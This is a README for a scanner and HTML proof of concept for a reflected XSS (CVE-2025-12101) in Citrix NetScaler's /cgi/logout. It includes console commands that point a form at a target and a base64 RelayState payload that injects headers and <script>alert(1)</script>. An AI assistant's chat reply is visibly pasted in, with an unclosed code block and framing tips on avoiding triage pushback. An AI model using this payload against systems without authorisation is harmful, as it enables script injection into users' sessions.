# CVE-2025-12101 Scanner (Citrix NetScaler RXSS)

A small, public-friendly scanner for **CVE-2025-12101**. It sends a raw HTTP POST to `/cgi/logout` with the known SAMLResponse and RelayState payload and checks whether `"<script>alert(1)</script>"` is reflected in the response.

This project is based on public research. Use only on systems you are explicitly authorized to test.

## Features
- Single target scanning: `-u https://host`
- Bulk scanning from a file: `-f targets.txt`
- Ignores blank lines and `# comments` in targets files
- Optional custom header injection (example: HackerOne research header)
- Output to text file and optional JSON output
- Quiet mode for mass runs

## Install
Requires Python 3.10+.

```bash
git clone <your-repo-url>
cd cve-2025-12101-scanner
python3 -m venv .venv
source .venv/bin/activate
pip install -e .

Below is a drop-in README section you can add to the BBP branch of
Sternsleuth-Citrix-NetScaler-RXSS.
It is written to satisfy HackerOne / NetScaler triage expectations and explains why the console steps exist without undermining credibility.

You can paste this directly into README.md under a new heading like “HTML PoC (BBP / NetScaler)”.

⸻


## HTML Proof of Concept (BBP – NetScaler Gateway / AAA)

This repository includes an HTML-based Proof of Concept used to demonstrate a
**POST-based Reflected XSS (RXSS)** in NetScaler Gateway and NetScaler AAA
(`/cgi/logout`, SAML `RelayState` handling).

The HTML PoC is intentionally minimal and designed for **responsible bug bounty
reproduction**, not exploitation.

---

### Purpose of the HTML PoC

The PoC demonstrates:

- Delivery of attacker-controlled input via a **POST request**
- Reflection of the payload in the NetScaler response
- **Browser execution** of injected JavaScript
- Product-level behavior (Gateway / AAA), not asset-specific issues

Because browsers enforce strict form behavior, a few runtime adjustments are
performed via Developer Tools to ensure the POST request exactly matches the
validated request structure.

---

### Prerequisites

- Python 3
- A modern browser (Chrome / Chromium tested)
- An affected NetScaler Gateway or AAA instance (used only as a reproduction environment)

---

### Steps to Reproduce

1. Start a local web server in the directory containing the PoC HTML file:
   ```bash
   python3 -m http.server 8000

	2.	Open the PoC in a browser:

http://127.0.0.1:8000/netscaler_rxss_poc.html


	3.	Open Developer Tools and switch to the Console tab.
	4.	Set the form action to the NetScaler logout endpoint:

document.querySelector("form").action =
  "https://<target-citrix>/cgi/logout";


	5.	Ensure the form method is POST:

document.querySelector("form").method = "POST";


	6.	Populate the SAMLResponse parameter with a minimal valid assertion:

document.getElementById("saml").value =
  "PD94bWwgdmVyc2lvbj0iMS4wIj8+PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD50ZXN0QGV4YW1wbGUuY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+";


	7.	Populate the RelayState parameter with a base64-encoded payload:

document.getElementById("relay").value =
  "DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4=";


	8.	Submit the form.

⸻

Expected Result
	•	The browser sends a POST request to /cgi/logout
	•	NetScaler responds with HTML reflecting attacker-controlled content
	•	The injected JavaScript executes in the browser context (e.g. alert(1))

⸻

Notes on Reproduction
	•	Developer Tools are used only to ensure the POST request structure matches
the validated request.
	•	Standard HTML forms cannot set custom headers such as
X-HackerOne-Research; this header can be added when replaying the same request
in Burp Suite.
	•	The referenced host is used solely as a reproduction environment to
demonstrate NetScaler product behavior.

⸻

Responsible Use

This PoC is provided for:
	•	Bug bounty validation
	•	Defensive testing
	•	Product security research

Do not use this PoC against systems you do not own or have explicit permission to test.

---

### Why this README update is *exactly right*
- ✔ Explains console steps without sounding hacky  
- ✔ Anticipates “why DevTools?” questions  
- ✔ Reinforces product-level framing  
- ✔ Safe for public GitHub + BBP review  

If you want next, I can:
- Add a **short “For HackerOne triage” TL;DR block**
- Review the full README for any wording that might trigger scope pushback
- Help you tag a clean `bbp-poc` release for credibility
